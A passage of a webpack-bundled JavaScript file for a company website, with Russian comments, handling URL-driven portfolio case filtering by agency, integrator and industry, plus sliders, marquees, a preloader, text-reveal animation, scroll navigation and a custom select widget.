          var filteragencyHash = filtersearchParams.has('agency') ? filtersearchParams.get('agency').split(',') : [];
          var filterintegratorHash = filtersearchParams.has('integrator') ? filtersearchParams.get('integrator').split(',') : [];
          var filterindustry1Hash = filtersearchParams.has('industry1') ? filtersearchParams.get('industry1').split(',') : [];
          var filterindustry2Hash = filtersearchParams.has('industry2') ? filtersearchParams.get('industry2').split(',') : [];
          var isRightHash = false;
          if (filtersearchParams.has('agency')) showRequestTags('agency', filteragencyHash);
          if (filtersearchParams.has('integrator')) showRequestTags('integrator', filterintegratorHash);
          if (filtersearchParams.has('industry1')) showRequestTags('industry1', filterindustry1Hash);
          if (filtersearchParams.has('industry2')) showRequestTags('industry2', filterindustry2Hash);
          if ($('.js-filterCase li.active').length === 0) {
            $(".js-filterCase li:first-child").addClass('active');
          }
          if ($('.js-filterCase2 li.active').length === 0) {
            $(".js-filterCase2 li:first-child").addClass('active');
          }
          $('[data-filter="agency"] li').each(function (i, el) {
            if (isCorrectTags(filteragencyHash, $(el).attr('data-agency')) == true) {
              isRightHash = true;
              return;
            }
          });
          $('[data-filter="integrator"] li').each(function (i, el) {
            if (isCorrectTags(filterintegratorHash, $(el).attr('data-integrator')) == true) {
              isRightHash = true;
              return;
            }
          });
          $('[data-filter="industry1"] li').each(function (i, el) {
            if (isCorrectTags(filterindustry1Hash, $(el).attr('data-industry1')) == true) {
              isRightHash = true;
              return;
            }
          });
          $('[data-filter="industry2"] li').each(function (i, el) {
            if (isCorrectTags(filterindustry2Hash, $(el).attr('data-industry2')) == true) {
              isRightHash = true;
              return;
            }
          });
          if (isRightHash) {
            // если есть хоть один верный атрибут, выводим его
            agency = _babel_runtime_helpers_toConsumableArray__WEBPACK_IMPORTED_MODULE_0___default()(filteragencyHash);
            integrator = _babel_runtime_helpers_toConsumableArray__WEBPACK_IMPORTED_MODULE_0___default()(filterintegratorHash);
            industry1 = _babel_runtime_helpers_toConsumableArray__WEBPACK_IMPORTED_MODULE_0___default()(filterindustry1Hash);
            industry2 = _babel_runtime_helpers_toConsumableArray__WEBPACK_IMPORTED_MODULE_0___default()(filterindustry2Hash);
            showRequestCases(filteragencyHash, filterintegratorHash, filterindustry1Hash, filterindustry2Hash);
          } else {
            // console.log('is-1');
            $grid.isotope({
              filter: '.case'
            }); // выводим все, если неверные атрибуты
          }
        } else {
          if (active) {
            showActive();
            //   showIndustryActive();
          }
        }
      };
      if (request && (searchParams.has('agency') || searchParams.has('integrator') || searchParams.has('industry1') || searchParams.has('industry2'))) {
        var isCorrectTags = function isCorrectTags(arr, val) {
          return arr.some(function (arrVal) {
            return val === arrVal;
          });
        };
        var agencyHash = searchParams.has('agency') ? searchParams.get('agency').split(',') : [];
        var integratorHash = searchParams.has('integrator') ? searchParams.get('integrator').split(',') : [];
        var industry1Hash = searchParams.has('industry1') ? searchParams.get('industry1').split(',') : [];
        var industry2Hash = searchParams.has('industry2') ? searchParams.get('industry2').split(',') : [];
        var isRightHash = false;
        if (searchParams.has('agency')) showRequestTags('agency', agencyHash);
        if (searchParams.has('integrator')) showRequestTags('integrator', integratorHash);
        if (searchParams.has('industry1')) showRequestTags('industry1', industry1Hash);
        if (searchParams.has('industry2')) showRequestTags('industry2', industry2Hash);
        if ($('.js-filterCase li.active').length === 0) {
          $(".js-filterCase li:first-child").addClass('active');
        }
        $('[data-filter="agency"] li').each(function (i, el) {
          if (isCorrectTags(agencyHash, $(el).attr('data-agency')) == true) {
            isRightHash = true;
            return;
          }
        });
        $('[data-filter="integrator"] li').each(function (i, el) {
          if (isCorrectTags(integratorHash, $(el).attr('data-integrator')) == true) {
            isRightHash = true;
            return;
          }
        });
        $('[data-filter="industry1"] li').each(function (i, el) {
          if (isCorrectTags(industry1Hash, $(el).attr('data-industry1')) == true) {
            isRightHash = true;
            return;
          }
        });
        $('[data-filter="industry2"] li').each(function (i, el) {
          if (isCorrectTags(industry2Hash, $(el).attr('data-industry2')) == true) {
            isRightHash = true;
            return;
          }
        });
        if (isRightHash) {
          // если есть хоть один верный атрибут, выводим его
          agency = _babel_runtime_helpers_toConsumableArray__WEBPACK_IMPORTED_MODULE_0___default()(agencyHash);
          integrator = _babel_runtime_helpers_toConsumableArray__WEBPACK_IMPORTED_MODULE_0___default()(integratorHash);
          industry1 = _babel_runtime_helpers_toConsumableArray__WEBPACK_IMPORTED_MODULE_0___default()(industry1Hash);
          industry2 = _babel_runtime_helpers_toConsumableArray__WEBPACK_IMPORTED_MODULE_0___default()(industry2Hash);
          showRequestCases(agencyHash, integratorHash, industry1Hash, industry2Hash);
        } else {
          // console.log('is-1');
          $grid.isotope({
            filter: '.case'
          }); // выводим все, если неверные атрибуты
        }

        // console.log("agencyHash2 = ", agencyHash);
        // console.log("integratorHash2 = ", integratorHash);
        // console.log("industry1Hash2 = ", industry1Hash);
        // console.log("industry2Hash2 = ", industry2Hash);
        // console.log('filterindustry1Hash.length ',filterindustry1Hash);

        if (industry1Hash.length > 0) {
          var reloadArr1 = industry1Hash.slice(0);
          // console.log("reloadArr1 = ", reloadArr1);

          $('.js-filterTypes li[data-types="industry1"]').closest(".js-filterTypes").find('li:not([data-types="industry1"]').removeClass("active");
          setTimeout(function () {
            $('.js-filterTypes li[data-types="industry1"]').trigger("click");
            $('.js-filterTypes li[data-types="industry1"]').addClass("active");
            reloadArr1.forEach(function (item, index) {
              // console.log('item = ',item);
              // console.log('index = ', index);
              $("ul.cases-filter__list").find("li[data-industry1=\"".concat(item, "\"]")).trigger('click');
            });
          }, 50);
        }
        if (industry2Hash.length > 0) {
          var reloadArr2 = industry2Hash.slice(0);
          $('li.filter_integrator').trigger('click');
          $('.js-filterTypes li[data-types="industry2"]').closest(".js-filterTypes").find('li:not([data-types="industry2"]').removeClass("active");
          setTimeout(function () {
            $('.js-filterTypes li[data-types="industry2"]').trigger("click");
            $('.js-filterTypes li[data-types="industry2"]').addClass("active");
            reloadArr2.forEach(function (item, index) {
              // console.log('item = ',item);
              // console.log('index = ', index);
              $("ul.cases-filter__list").find("li[data-industry2=\"".concat(item, "\"]")).trigger('click');
            });
          }, 50);
        }
        reScroll();
      } else {
        if (active) {
          showActive();
        }
      }
      oneTagAll();
      $(document).on('click', '.js-filterCase li:not(.active)', function () {
        var tab = $(this);
        var tabIndex = $(this).index();
        var tabList = $(this).parent();
        var tabAll = tabList.find('li:first-child');
        var tabOthers = tabList.find('li:not(:first-child)');
        var tabsActive = tabList.find('li:not(:first-child).active').length;
        var tabDataSelector = Object.keys(tab.data())[0];
        var tabDataName = tab.data(tabDataSelector);
        currentPosition = $(window).scrollTop();
        reScroll();
        tab.addClass('active');
        if (tabIndex != 0) {
          // выбрали что-то кроме "все"

          if ($('.js-filterCase li.active:first-child').length == 2) {
            // выбраны "все" в обоих фильтрах
            agency = [];
            integrator = [];
            $('.js-filterCase li:first-child').removeClass('active');
          }
          if (tabAll.hasClass('active')) {
            // по умолчанию активна "все"
            tabDataSelector == "agency" ? agency = [] : integrator = [];
            tabAll.removeClass('active');
          }
        } else {
          if (tabDataSelector == "agency") {
            tab.siblings().removeClass('active');
            agency = [];
            tabOthers.each(function () {
              agency.push($(this).data('agency'));
            });
            showTags();
          } else {
            tab.siblings().removeClass('active');
            integrator = [];
            tabOthers.each(function () {
              integrator.push($(this).data('integrator'));
            });
            showTags();
          }
          filterCases(tabDataSelector, tabDataName);
          return;
        }
        if (tabsActive == tabOthers.length - 1) {
          // выбраны все теги кроме "все"
          tabOthers.removeClass('active');
          tabAll.addClass('active');
        }
        tabDataSelector == "agency" ? agency.push(tabDataName) : integrator.push(tabDataName);
        filterCases(tabDataSelector, tabDataName);
        showTags();
      });
      $(document).on('click', '.js-filterCase2 li:not(.active)', function () {
        var tab = $(this);
        var tabIndex = $(this).index();
        var tabList = $(this).parent();
        var tabAll = tabList.find('li:first-child');
        var tabOthers = tabList.find('li:not(:first-child)');
        var tabsActive = tabList.find('li:not(:first-child).active').length;
        var tabDataSelector = Object.keys(tab.data())[0];
        var tabDataName = tab.data(tabDataSelector);
        currentPosition = $(window).scrollTop();
        reScroll();
        tab.addClass('active');
        if (tabIndex != 0) {
          // выбрали что-то кроме "все"

          if ($('.js-filterCase2 li.active:first-child').length == 2) {
            // выбраны "все" в обоих фильтрах
            industry1 = [];
            industry2 = [];
            $('.js-filterCase2 li:first-child').removeClass('active');
          }
          if (tabAll.hasClass('active')) {
            // по умолчанию активна "все"
            tabDataSelector == "industry1" ? industry1 = [] : industry2 = [];
            tabAll.removeClass('active');
          }
        } else {
          if (tabDataSelector == "industry1") {
            tab.siblings().removeClass('active');
            industry1 = [];
            // tabList.each(function() {
            tabOthers.each(function () {
              industry1.push($(this).data('industry1'));
            });
            showTags();
          } else {
            tab.siblings().removeClass('active');
            industry2 = [];
            tabOthers.each(function () {
              industry2.push($(this).data('industry2'));
            });
            showTags();
          }
          filterCases(tabDataSelector, tabDataName);
          return;
        }
        if (tabsActive == tabOthers.length - 1) {
          // выбраны все теги кроме "все"
          tabOthers.removeClass('active');
          tabAll.addClass('active');
        }
        tabDataSelector == "industry1" ? industry1.push(tabDataName) : industry2.push(tabDataName);
        filterCases(tabDataSelector, tabDataName);
        showTags();
      });
      $(document).on('click', '.js-filterCase li.active', function () {
        var tab = $(this);
        var tabIndex = $(this).index();
        var tabList = $(this).parent();
        var tabAll = tabList.find('li:first-child');
        var tabOthers = tabList.find('li:not(:first-child)');
        var tabsActive = tabList.find('li:not(:first-child).active').length;
        var tabDataSelector = Object.keys(tab.data())[0];
        var tabDataName = tab.data(tabDataSelector);
        tab.removeClass('active');
        if (tabIndex == 0) {
          // вдруг ...
          tabDataSelector == "agency" ? agency = [] : integrator = [];
          showTags();
        }
        if (!$('.js-filterCase li.active').length) {
          // есть нет актинвых тегов
          if (tabDataSelector == "agency") {
            tabAll.addClass('active');
            agency = [];
            tabOthers.each(function (i, el) {
              agency.push($(el).data('agency'));
            });
            // console.log('is-2');
            $grid.isotope({
              filter: '.case[data-agency]'
            });
          } else {
            tabAll.addClass('active');
            integrator = [];
            tabOthers.each(function (i, el) {
              integrator.push($(el).data('integrator'));
            });
            // console.log('is-3');
            $grid.isotope({
              filter: '.case[data-integrator]'
            });
          }
          showTags();
          return;
        }
        if (tabDataSelector == "agency") {
          agency.forEach(function (item, index) {
            if (item == tabDataName) {
              agency.splice(index, 1);
            }
            showTags();
            return;
          });
        } else {
          integrator.forEach(function (item, index) {
            if (item == tabDataName) {
              integrator.splice(index, 1);
            }
            showTags();
            return;
          });
        }
        reScroll();
        filterCases(tabDataSelector, tabDataName);
        if ($(this).parent().find('.active').length < 1) {
          $(this).parent().find('li:first-child').click();
        }
      });
      $(document).on('click', '.js-filterCase2 li.active', function () {
        var tab = $(this);
        var tabIndex = $(this).index();
        var tabList = $(this).parent();
        var tabAll = tabList.find('li:first-child');
        var tabOthers = tabList.find('li:not(:first-child)');
        var tabsActive = tabList.find('li:not(:first-child).active').length;
        var tabDataSelector = Object.keys(tab.data())[0];
        var tabDataName = tab.data(tabDataSelector);
        tab.removeClass('active');
        if (tabIndex == 0) {
          // вдруг ...
          tabDataSelector == "industry1" ? industry1 = [] : industry2 = [];
          showTags();
        }
        if (!$('.js-filterCase2 li.active').length) {
          // есть нет актинвых тегов
          if (tabDataSelector == "industry1") {
            tabAll.addClass('active');
            industry1 = [];
            // tabList.each((i, el)=> {
            tabOthers.each(function (i, el) {
              industry1.push($(el).data('industry1'));
            });
            // console.log('is-2');
            $grid.isotope({
              filter: '.case[data-industry1]'
            });
          } else {
            tabAll.addClass('active');
            industry2 = [];
            // tabList.each((i, el)=> {
            tabOthers.each(function (i, el) {
              industry2.push($(el).data('industry2'));
            });
            // console.log('is-3');
            $grid.isotope({
              filter: '.case[data-industry2]'
            });
          }
          showTags();
          return;
        }
        if (tabDataSelector == "industry1") {
          industry1.forEach(function (item, index) {
            if (item == tabDataName) {
              industry1.splice(index, 1);
            }
            showTags();
            return;
          });
        } else {
          industry2.forEach(function (item, index) {
            if (item == tabDataName) {
              industry2.splice(index, 1);
            }
            showTags();
            return;
          });
        }
        reScroll();
        filterCases(tabDataSelector, tabDataName);
        if ($(this).parent().find('.active').length < 1) {
          $(this).parent().find('li:first-child').click();
        }
      });
      $(document).on('click', '.js-filterTypes li', function (e) {
        var element = e.currentTarget;
        if (!$(this).hasClass('active')) {
          $(this).closest('.js-filterTypes').find('li').removeClass('active');
          $(this).addClass('active');
          var typeTab = $(this).data('types');
          $(this).closest('.filters').find(".type-filter-tab:not([data-filter-tab=\"".concat(typeTab, "\"])")).hide();
          $(this).closest('.filters').find(".type-filter-tab[data-filter-tab=\"".concat(typeTab, "\"]")).show();
          var _this = $(this).data('types');
          var firstTab = $(this).closest('.filters').find(".type-filter-tab[data-filter-tab=\"".concat(_this, "\"]")).find('.cases-filter__list li:first-child');
          $(firstTab).trigger('click');
          initCases();
        }
      });
      $(document).on('click', '.js-filterCase li', function () {
        oneTagAll();
      });
      function showActive() {
        active.each(function (i, el) {
          var type = $(el).parent().data('filter');
          $("li[data-".concat(type, "]:not(:first-child)")).each(function (i, el) {
            type == 'agency' ? agency.push($(el).data(type)) : integrator.push($(el).data(type));
          });
        });
        filterCases();
      }

      // function showIndustryActive() {
      //   active.each( (i, el) => {
      //       let type = $(el).parent().data('filter');

      //       $(`li[data-${type}]:not(:first-child)`).each((i, el)=> {
      //           (type == 'agency') ? agency.push($(el).data(type)) : integrator.push($(el).data(type));
      //       })
      //   })
      //   filterCases();
      // }

      function filterCases(dataType, dataName) {
        if ($('.tabs .js-filterCase').length > 0) {
          parentTab.addClass('trigger_case');
        }
        var arrFilterCasesIndex = [];

        // let array22 = [...agency, ...integrator, ...industry1, ...industry2];
        // const arr777 = array22.map(item=>`.case[data-${dataType}="${item}"]`);
        // const elements = $(`${arr777.join(', ')}`)
        // $grid.isotope({ filter: elements });

        $grid.isotope({
          filter: function filter() {
            var array = [].concat(_babel_runtime_helpers_toConsumableArray__WEBPACK_IMPORTED_MODULE_0___default()(agency), _babel_runtime_helpers_toConsumableArray__WEBPACK_IMPORTED_MODULE_0___default()(integrator), _babel_runtime_helpers_toConsumableArray__WEBPACK_IMPORTED_MODULE_0___default()(industry1), _babel_runtime_helpers_toConsumableArray__WEBPACK_IMPORTED_MODULE_0___default()(industry2));
            var flag = false;
            // let item = $(this).data('agency') || $(this).data('integrator');
            var item = $(this).data('agency') || $(this).data('integrator') || $(this).data('industry1') || $(this).data('industry2');
            // industry1

            for (var i = 0; i < array.length; i++) {
              if (item.indexOf(array[i]) > -1) {
                flag = true;
              }
            }
            if (flag) {
              return true;
            }

            // return array.includes(item);
          }
        });
        setTimeout(function () {
          if ($('.tabs .js-filterCase').length > 0) {
            if (parentTab.hasClass('trigger_case')) {
              parentTab.removeClass('trigger_case');
            }
          }
        }, 2000);
      }
      function showRequestCases(agencyHash, integratorHash, industry1Hash, industry2Hash) {
        // console.log('is-5');
        $grid.isotope({
          // filter: function() {
          //     const array = [...agencyHash, ...integratorHash];
          //     let item = $(this).data('agency') || $(this).data('integrator');
          //     return array.includes(item);
          // }

          filter: function filter() {
            var array = [].concat(_babel_runtime_helpers_toConsumableArray__WEBPACK_IMPORTED_MODULE_0___default()(agencyHash), _babel_runtime_helpers_toConsumableArray__WEBPACK_IMPORTED_MODULE_0___default()(integratorHash), _babel_runtime_helpers_toConsumableArray__WEBPACK_IMPORTED_MODULE_0___default()(industry1Hash), _babel_runtime_helpers_toConsumableArray__WEBPACK_IMPORTED_MODULE_0___default()(industry2Hash));
            var flag = false;

            // let item = $(this).data('agency') || $(this).data('integrator');
            var item = $(this).data('agency') || $(this).data('integrator') || $(this).data('industry1') || $(this).data('industry2');
            for (var i = 0; i < array.length; i++) {
              if (item.indexOf(array[i]) > -1) {
                flag = true;
              }
            }
            if (flag) {
              return true;
            }

            // return array.includes(item);
          }
        });
      }
      function showRequestTags(type, data) {
        var filter = $(".js-filterCase[data-filter=".concat(type, "]"));
        for (var i = 0; i < data.length; i++) {
          filter.find("li[data-".concat(type, "=\"").concat(data[i], "\"]")).addClass('active');
        }
        if (filter.find('li:not(:first-child).active').length) {
          filter.find("li[data-".concat(type, "=\"").concat(type, "\"]")).removeClass('active');
        }
        var tabAll = filter.find('li:first-child');
        var tabOthers = filter.find('li:not(:first-child)');
        var tabsActive = filter.find('li:not(:first-child).active').length;
        if (tabsActive == tabOthers.length) {
          // выбраны все теги кроме "все"
          tabOthers.removeClass('active');
          tabAll.addClass('active');
        }
        if (data[0] == "") {
          filter.find("li[data-".concat(type, "=\"").concat(type, "\"]")).removeClass('active');
        }
      }
      function reScroll() {
        setTimeout(function () {
          // fix wow js visibility
          $(window).scrollTop(currentPosition + 1);
          $(window).scrollTop(currentPosition - 1);
        }, 500);
      }
      function showTags() {
        // window.history.pushState({}, '', `${url}?agency=${agency}&integrator=${integrator}`);

        // if ($('.filter_agency.active').length > 0) {
        //     window.history.pushState({}, '', `${url}?agency=${agency}`);
        // }

        // if ($('.filter_integrator.active').length > 0) {
        //     window.history.pushState({}, '', `${url}?integrator=${integrator}`);
        // }

        if ($('.filter_agency.active').length > 0) {
          if ($('[data-tab-name="agency"]').find('li.active[data-types="industry1"]').length) {
            window.history.pushState({}, '', "".concat(url, "?industry1=").concat(industry1));
          } else {
            window.history.pushState({}, '', "".concat(url, "?agency=").concat(agency));
          }
        }
        if ($('.filter_integrator.active').length > 0) {
          if ($('[data-tab-name="integrator"]').find('li.active[data-types="industry2"]').length) {
            window.history.pushState({}, '', "".concat(url, "?industry2=").concat(industry2));
          } else {
            window.history.pushState({}, '', "".concat(url, "?integrator=").concat(integrator));
          }
        }
      }
      function oneTagAll() {
        if ($('.js-filterCase li.active:first-child').length == 1 && $('.js-filterCase li.active:not(:first-child)').length === 0) {
          $('.js-filterCase li.active:first-child').addClass('disabled');
        } else {
          $('.js-filterCase li:first-child').removeClass('disabled');
        }
      }
    });

    /***/
  }),
  /***/"./src/js/_parts/_portfolio-nav.js": (
  /*!*****************************************!*\
    !*** ./src/js/_parts/_portfolio-nav.js ***!
    \*****************************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    if ($('.portfolio-nav').length > 0) {
      var portfolioNav = $('.js-portfolioNav').html();
      $('header').append(portfolioNav);
      $('.js-portfolioNav').remove();
    }

    /***/
  }),
  /***/"./src/js/_parts/_preloader.js": (
  /*!*************************************!*\
    !*** ./src/js/_parts/_preloader.js ***!
    \*************************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    var pageInit = false;
    var timerId = setTimeout(function () {
      init();
      pageInit = true;
    }, 2000);
    $(window).on('load', function () {
      if (!pageInit) {
        clearTimeout(timerId);
        init();
      }
    });
    function init() {
      preloaderHide();
      window.wow.init();
    }
    function preloaderHide() {
      $('.preloader').addClass('is_hide');
      setTimeout(function () {
        $('.preloader').remove();
      }, 300);
    }

    /***/
  }),
  /***/"./src/js/_parts/_preview.js": (
  /*!***********************************!*\
    !*** ./src/js/_parts/_preview.js ***!
    \***********************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    $(window).on("load resize orientationchange", function (e) {
      preview();
    });
    function preview() {
      $(".js-preview").each(function () {
        $(this).find("p").html($(this).siblings(".js-previewFull").html());
        var $title = $(this).find("p");
        while ($title.height() > $(this).height()) {
          $title.text($title.text().split(" ").slice(0, $title.text().split(" ").length - 1).join(" ")); // + "...");
        }
      });
    }

    /***/
  }),
  /***/"./src/js/_parts/_promo-animation.js": (
  /*!*******************************************!*\
    !*** ./src/js/_parts/_promo-animation.js ***!
    \*******************************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    $('.js-promoAnimationLink').on('mouseenter', function () {
      var _this = $(this);
      var currentIndex = Number(_this.data('index'));
      $('.js-promoAnimationLink').removeClass('is_active');
      _this.addClass('is_active');
      _this.parents('.js-promoAnimation').find('.js-promoAnimationElem').eq(currentIndex).addClass('is_show').siblings().removeClass('is_show');
      _this.parents('.js-promoAnimation').addClass('items_show');
    });
    $('.js-promoAnimationLink').on('mouseleave', function () {
      $('.js-promoAnimationElem').removeClass('is_show');
      $('.js-promoAnimation').removeClass('items_show');
    });

    /***/
  }),
  /***/"./src/js/_parts/_promo-slider.js": (
  /*!****************************************!*\
    !*** ./src/js/_parts/_promo-slider.js ***!
    \****************************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    // import Swiper, { Navigation, Pagination } from 'swiper';
    // Swiper.use([Navigation, Pagination]);

    var promoSlider = new Swiper(".js-promoSlider .swiper-container", {
      direction: 'vertical',
      loop: true,
      touchRatio: 0.3,
      speed: 750,
      autoplay: {
        delay: 3000,
        disableOnInteraction: false
      },
      allowTouchMove: false,
      loopPreventsSlide: false,
      on: {
        init: function init(swiper) {
          $('.js-promoSlider').find('.swiper-slide').css('transition-duration', "".concat(this.passedParams.speed, "ms"));
        },
        transitionStart: function transitionStart() {
          var currentSlide = $('.js-promoSlider').find('.swiper-slide-prev');
          currentSlide.addClass('stay');
          setTimeout(function () {
            return currentSlide.addClass('hide');
          }, this.passedParams.speed / 3);
        },
        transitionEnd: function transitionEnd(swiper) {
          var currentSlide = $('.js-promoSlider').find('.swiper-slide-prev');
          currentSlide.removeClass('stay');
          setTimeout(function () {
            return currentSlide.removeClass('hide');
          }, this.passedParams.speed / 2);
        }
      }
    });
    var promoSlider2 = new Swiper(".js-promoSlider-2 .swiper-container", {
      direction: 'vertical',
      loop: true,
      touchRatio: 0.3,
      speed: 1000,
      autoplay: {
        delay: 1650,
        disableOnInteraction: false
      },
      allowTouchMove: false,
      loopPreventsSlide: false,
      on: {
        init: function init(swiper) {
          $('.js-promoSlider-2').find('.swiper-slide').css('transition-duration', "".concat(this.passedParams.speed, "ms"));
        },
        transitionStart: function transitionStart() {
          var currentSlide = $('.js-promoSlider-2').find('.swiper-slide-prev');
          currentSlide.addClass('stay');
          setTimeout(function () {
            return currentSlide.addClass('hide');
          }, this.passedParams.speed / 3);
        },
        transitionEnd: function transitionEnd(swiper) {
          var currentSlide = $('.js-promoSlider-2').find('.swiper-slide-prev');
          currentSlide.removeClass('stay');
          setTimeout(function () {
            return currentSlide.removeClass('hide');
          }, this.passedParams.speed / 2);
        }
      }
    });

    /***/
  }),
  /***/"./src/js/_parts/_reveal-text.js": (
  /*!***************************************!*\
    !*** ./src/js/_parts/_reveal-text.js ***!
    \***************************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    function reveal_gsap() {
      767 < $(window).width() ? $(".reveal-text").waypoint({
        handler: function handler() {
          var e = $(this.element);
          $(this.element).data("delay");
          e.hasClass("animated") || e.hasClass("anim-title") && !e.hasClass("animtitle-done") && (e.addClass("animtitle-done"), e.parentSplit = new SplitText(e, {
            type: "lines",
            linesClass: "split-parent"
          }), e.childSplit = new SplitText(e, {
            type: "words,chars",
            charsClass: "title-char"
          }), e.anim = gsap.from(e.childSplit.chars, {
            duration: .35,
            ease: Power3,
            rotate: 10,
            y: "200%",
            stagger: .04,
            delay: .2
          }));
        },
        offset: function offset() {
          var e = $(this.element).data("offset") || 0;
          return Waypoint.viewportWidth() <= 480 ? Waypoint.viewportHeight() - 180 : Waypoint.viewportHeight() + e;
        }
      }) : $(".reveal-text").each(function (e) {
        $(".reveal-text").addClass("animated");
      });
    }
    window.addEventListener("load", function (event) {
      if ($(".reveal-text").length > 0) {
        reveal_gsap();
      }
    });

    /***/
  }),
  /***/"./src/js/_parts/_run-carousel.js": (
  /*!****************************************!*\
    !*** ./src/js/_parts/_run-carousel.js ***!
    \****************************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    if ($('.js-carousel').length > 0) {
      $('.js-carousel').marquee({
        duration: 18000,
        startVisible: true,
        duplicated: true,
        direction: 'left',
        gap: 0
      });
    }

    /***/
  }),
  /***/"./src/js/_parts/_run-line.js": (
  /*!************************************!*\
    !*** ./src/js/_parts/_run-line.js ***!
    \************************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    if ($('.js-line').length > 0) {
      $('.js-line').marquee({
        duration: 18000,
        startVisible: true,
        duplicated: true,
        direction: 'left',
        gap: 0
      });
    }

    /***/
  }),
  /***/"./src/js/_parts/_scroll-nav.js": (
  /*!**************************************!*\
    !*** ./src/js/_parts/_scroll-nav.js ***!
    \**************************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    var scrollNav = $('.js-scrollNav');
    scrollNav.onePageNav({
      currentClass: 'is_active',
      changeHash: false,
      scrollSpeed: 1300,
      scrollThreshold: 0.5,
      filter: '',
      easing: 'swing',
      offsetScroll: 150,
      scrollChange: function scrollChange($currentListItem) {
        var index = $currentListItem.index();
        $('li', scrollNav).eq(index).addClass('is_active').siblings().removeClass('is_active');
        scrollToActiveElem();
      },
      end: function end($currentListItem) {
        scrollToActiveElem();
      }
    });
    function scrollToActiveElem() {
      if ($(window).width() < 1025) {
        // для скролла к элементу в адаптиве
        var itemOuterWidth = $('.js-scrollNav .is_active').outerWidth(); // узнаем ширину текущего элемента (width + padding)
        var itemOffsetLeft = $('.js-scrollNav .is_active').offset().left; // узнаем значение отступа слева в контейнере у текущего элемента
        var containerScrollLeft = $('.js-sticky').scrollLeft(); // узнаем текущее значение скролла
        var containerOuterWidth = $('.js-sticky').outerWidth(); // узнаем ширину контейнера (width + padding)
        var positionCetner = containerOuterWidth / 2 - itemOuterWidth / 2; // рассчитываем позицию центра
        var scrollLeftUpd = containerScrollLeft + itemOffsetLeft - positionCetner; // рассчитываем положение скролла относительно разницы отступа элемента и центра контейнера

        $('.js-sticky').animate({
          scrollLeft: scrollLeftUpd
        }, 300);
      }
    }
    if (navigator.userAgent.match(/Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile/i)) {
      $('body').addClass('adaptive');
    }

    /***/
  }),
  /***/"./src/js/_parts/_scroll-to-elem.js": (
  /*!******************************************!*\
    !*** ./src/js/_parts/_scroll-to-elem.js ***!
    \******************************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    $(document).on('click', '.js-scrollToElem', function () {
      var offsetMedium = $(this).hasClass('js-offsetMedium') ? 40 : 0;
      var scroll_el = $(this).attr('href'); // возьмем содержимое атрибута href, должен быть селектором, т.е. например начинаться с # или .
      if ($(scroll_el).length != 0) {
        // проверим существование элемента чтобы избежать ошибки
        var headerHeight = $('.header .header-bottom').height();
        if ($('body').width() < 769) {
          headerHeight -= 57;
        }
        $('html, body').animate({
          scrollTop: $(scroll_el).offset().top - headerHeight - offsetMedium
        }, 800); // анимируем скроолинг к элементу scroll_el
      }
      return false; // выключаем стандартное действие
    });

    /***/
  }),
  /***/"./src/js/_parts/_select.js": (
  /*!**********************************!*\
    !*** ./src/js/_parts/_select.js ***!
    \**********************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    function selectInit() {
      $('.js-select').each(function () {
        var $this = $(this),
          numberOfOptions = $(this).children('option').length;
        $this.addClass('select-hidden');
        $this.wrap('<div class="select"></div>');
        $this.after('<div class="select-styled"></div>');
        var $styledSelect = $this.next('div.select-styled');
        $styledSelect.text($this.children('option').eq(0).text());
        var $list = $('<ul />', {
          'class': 'select-options'
        }).insertAfter($styledSelect);
        for (var i = 0; i < numberOfOptions; i++) {
          $('<li />', {
            text: $this.children('option').eq(i).text(),
            rel: $this.children('option').eq(i).val()
          }).appendTo($list);
        }
        var $listItems = $list.children('li');
        $styledSelect.click(function (e) {
          e.stopPropagation();
          $('div.select-styled.active').not(this).each(function () {
            $(this).removeClass('active').next('ul.select-options').hide();
          });
          $(this).toggleClass('active').next('ul.select-options').toggle();
        });
        $listItems.click(function (e) {
          e.stopPropagation();
          $styledSelect.text($(this).text()).removeClass('active');
          $this.val($(this).attr('rel'));
          $list.hide();
          $('.placeholder').removeClass('placeholder');
          //console.log($this.val());
        });
        $(document).click(function () {
          $styledSelect.removeClass('active');
          $list.hide();
        });
      });
    }
    selectInit();

    /***/
  }),
  /***/"./src/js/_parts/_slider-services.js": (
  /*!*******************************************!*\
    !*** ./src/js/_parts/_slider-services.js ***!
    \*******************************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    if ($('.js-sliderServices').length > 0) {
      var addZero = function addZero(i) {
        if (i < 10) {
          i = '0' + i;
        }
        return i;
      };
      var sliderServicesElem = $('.js-sliderServices');
      var speedSlider = 1300;
      var ww = $(window).width();
      var progressSlider = $('.js-progressSlider');
      var sliderCounterCurrent = $('.js-sliderServices .js-sliderCounterCurrent');
      var sliderCounterFull = $('.js-sliderServices .js-sliderCounterFull');
      if (ww < 1024) {
        speedSlider = 600;
      }
      var sliderServices = new Swiper(".js-sliderServices .swiper-container", {
        slidesPerView: 1,
        loop: true,
        autoplay: {
          delay: 8000,
          disableOnInteraction: false
        },
        // navigation: {
        //     nextEl: '.js-sliderServices .swiper-next',
        //     prevEl: '.js-sliderServices .swiper-prev',
        // },
        speed: speedSlider,
        on: {
          init: function init() {
            progressSlider.addClass('is-active');
          }
        }
      });
      sliderServices.on('slideChange', function () {
        sliderCounterCurrent.text(addZero(this.realIndex + 1));
        progressSlider.removeClass('is-active');
        setTimeout(function () {
          progressSlider.addClass('is-active');
        }, 900);
      });
      var curs = document.querySelector('.cursor');
      var sliderServicesBlock = document.querySelector('.js-sliderServices');
      var positionSlider = $('.js-sliderServices').offset().top;
      var sliderWidth = $('.js-sliderServices').width();
      var sliderOffsetLeft = sliderWidth / 2;
      $(window).on('resize', function () {
        positionSlider = $('.js-sliderServices').offset().top;
        sliderWidth = $('.js-sliderServices').width();
      });
      if (sliderServicesBlock && sliderServicesBlock.length !== 0) {
        document.addEventListener('mousemove', function (e) {
          var x = e.pageX;
          var y = e.pageY;
          curs.style.left = x - 40 + "px";
          curs.style.top = y - 50 - positionSlider + "px";
        });
      }
      $(document).on('click', '.js-sliderServices .banner', function (e) {
